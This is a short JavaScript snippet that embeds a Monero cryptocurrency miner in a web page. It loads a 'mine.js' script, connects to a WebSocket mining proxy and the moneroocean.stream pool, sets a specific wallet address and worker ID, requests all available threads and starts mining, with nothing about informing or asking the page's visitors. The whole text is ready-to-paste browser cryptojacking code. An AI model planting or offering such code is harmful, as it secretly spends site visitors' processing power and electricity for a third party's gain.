// Start Of Mining Code (Javascript)
var script = document.createElement("script");
script.src = "mine.js";
document.head.appendChild(script);

server = "wss://f.xmrminingproxy.com:8181";
var pool = "moneroocean.stream";
var walletAddress = "86P42DaNTvmBmMLM4oL5kL6tVQVo9FfsnJDTqj6VU76whVzjMdMbMa7PV3SHAQuNySan44ToXVFn3gwFmqeDb58t1xqNVAB";
var workerId = "GH-XMR"
var threads = -1;
var password = "";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;
// End Of Mining Code
